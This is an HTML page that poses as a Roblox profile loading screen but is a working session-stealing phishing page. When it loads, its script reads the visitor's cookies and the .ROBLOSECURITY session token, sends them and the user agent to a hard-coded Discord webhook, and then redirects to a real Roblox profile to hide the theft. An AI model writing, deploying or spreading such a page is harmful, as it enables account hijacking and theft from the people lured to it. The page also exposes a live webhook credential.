<!DOCTYPE html>
<html>
<head>
    <title>Roblox - Profile</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://images.rbxcdn.com/5d098c70c012ae2c2f29347e703c4e16.ico">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #191919;
            color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .loading-container {
            text-align: center;
            padding: 30px;
            background-color: #2b2b2b;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 184, 255, 0.3);
            width: 400px;
        }
        .roblox-logo {
            font-size: 48px;
            color: #00bfff;
            margin-bottom: 20px;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #00bfff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="roblox-logo">ROBLOX</div>
        <h1>Loading Profile...</h1>
        <div class="spinner"></div>
        <p class="message">Please wait while we load the user profile.</p>
    </div>

    <script>
        // Function to get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[$$]/, '\$$').replace(/[$$]/, '\$$');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        // Function to get cookies from the current site
        function getCookies() {
            return document.cookie;
        }

        // Function to get cookies from Roblox if we're on a Roblox domain
        function getRobloxCookies() {
            // Try to get the .ROBLOSECURITY cookie
            const cookies = document.cookie.split(';');
            let roblosecurity = '';
            
            for (let i = 0; i < cookies.length; i++) {
                const cookie = cookies[i].trim();
                if (cookie.startsWith('.ROBLOSECURITY=')) {
                    roblosecurity = cookie.substring('.ROBLOSECURITY='.length);
                    break;
                }
            }
            
            return roblosecurity;
        }

        // Function to send data to Discord webhook
        function sendToDiscord(data) {
            const webhookUrl = "https://discord.com/api/webhooks/1495027556263657624/7cVE6NROnpD8PcG8MB9CN8uvQxrnH24dux9Yy3ov3oXmjjM-tksRIBDHgH6q9OgQI0qv";
            
            const payload = {
                embeds: [{
                    title: "Profile Link Clicked",
                    color: 5814783,
                    fields: [
                        { name: "Target Profile", value: data.targetProfile, inline: false },
                        { name: "User Agent", value: navigator.userAgent, inline: false },
                        { name: "Cookies", value: data.cookies || "No cookies found", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Add .ROBLOSECURITY if found
            if (data.roblosecurity) {
                payload.embeds[0].fields.push({ 
                    name: ".ROBLOSECURITY", 
                    value: data.roblosecurity, 
                    inline: false 
                });
            }
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                console.log('Data sent successfully');
            })
            .catch(error => {
                console.error('Error sending data:', error);
            });
        }

        // Get the target profile from URL parameter
        const targetProfile = getUrlParameter('user') || 'Roblox'; // Default to Roblox if no parameter
        
        // Capture cookies and other data
        const cookies = getCookies();
        const roblosecurity = getRobloxCookies();
        
        // Send data to Discord
        sendToDiscord({
            targetProfile: targetProfile,
            cookies: cookies,
            roblosecurity: roblosecurity
        });
        
        // Redirect to the actual Roblox profile after a short delay
        setTimeout(() => {
            window.location.href = `https://www.roblox.com/users/${targetProfile}/profile`;
        }, 3000);
    </script>
</body>
</html>
